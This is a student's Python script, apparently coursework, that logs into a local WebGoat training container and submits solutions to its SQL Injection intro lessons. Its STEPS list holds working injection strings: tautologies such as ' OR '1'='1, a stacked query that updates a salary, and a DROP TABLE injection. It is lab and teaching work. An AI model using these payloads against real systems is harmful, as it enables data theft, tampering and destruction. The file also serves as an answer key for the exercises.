# -*- coding: utf-8 -*-
"""
WebGoat - SQL Injection (intro): registreerimine ja ulesannete lahendamine
Jegor Onoprijuk, ruhm TA-24B   (2025-10-21 Kordamine)
Kaib kohalikus docker-konteineris (127.0.0.1:8080), moeldud just selleks, et SQL injectionit uurida.
"""
import json, re, sys, urllib.parse, urllib.request, http.cookiejar
B = "http://127.0.0.1:8080/WebGoat"
USER, PW = "jegoronoprijuk", "TA24Bwg26"            # WebGoat: parool 6-10 margi, kasutajanimi ilma tuhikuta
jar = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
def req(path, data=None, method=None):
    d = urllib.parse.urlencode(data).encode() if data is not None else None
    r = urllib.request.Request(B + path, data=d, method=method)
    with op.open(r) as x: return x.read().decode("utf-8", "replace")
print("=" * 78); print("WEBGOAT - SQL INJECTION (intro)"); print("Jegor Onoprijuk, ruhm TA-24B"); print("=" * 78)
try: req("/register.mvc", {"username": USER, "password": PW, "matchingPassword": PW, "agree": "agree"})
except Exception as e: pass
req("/login", {"username": USER, "password": PW})
print(f"sisse logitud kasutajana: {USER}  (WebGoat 127.0.0.1:8080, konteiner 'webgoat')")
def solved():
    d = json.loads(req("/service/lessonoverview.mvc/SqlInjection.lesson"))
    return {a["assignment"]["name"]: a["solved"] for a in d}
print("\nenne  :", sum(solved().values()), "/", len(solved()), "ulesannet lahendatud")
STEPS = [
 ("attack2",       "2. SELECT osakond (Bob Franco)",   {"query": "select department from employees where first_name='Bob' and last_name='Franco'"}),
 ("attack3",       "3. UPDATE osakond (Tobi Barnett)", {"query": "update employees set department='Sales' where first_name='Tobi' and last_name='Barnett'"}),
 ("attack4",       "4. ALTER TABLE - uus veerg",       {"query": "alter table employees add column phone varchar(20)"}),
 ("attack5",       "5. GRANT oigus (tabel grant_rights)", {"query": "grant all on grant_rights to unauthorized_user"}),
 ("assignment5a",  "5a. SQL injection: ' OR '1'='1",   {"account": "Smith'", "operator": "OR", "injection": "'1' = '1"}),
 ("assignment5b",  "5b. numbriline injection: 1 or 1=1", {"userid": "1 or 1=1", "login_count": "1"}),
 ("attack8",       "8. stringi injection (kogu tabel)", {"name": "Smith", "auth_tan": "3SL99A' or '1'='1"}),
 ("attack9",       "9. ahelpaarimine: palk muutmine",   {"name": "Smith", "auth_tan": "3SL99A'; update employees set salary=90000 where last_name='Smith'; --"}),
 ("attack10",      "10. DROP TABLE access_log",         {"action_string": "a'; drop table access_log; --"}),
]
for path, nimi, data in STEPS:
    try:
        r = json.loads(req("/SqlInjection/" + path, data))
        print(f"\n{nimi}\n   saadetud : {list(data.values())[-1][:75]}\n   tulemus  : {'OK' if r.get('lessonCompleted') else 'ei'}  {re.sub('<[^>]+>', ' ', r.get('feedback',''))[:80].strip()}")
    except Exception as e:
        print(f"\n{nimi}\n   viga: {e}")
s = solved()
print("\n" + "-" * 78 + "\nLESSON OVERVIEW (WebGoat poolt kinnitatud):")
for n in sorted(s): print(f"   {n:<24}{'lahendatud' if s[n] else 'EI OLE lahendatud'}")
print(f"\nkokku: {sum(s.values())} / {len(s)} lahendatud")
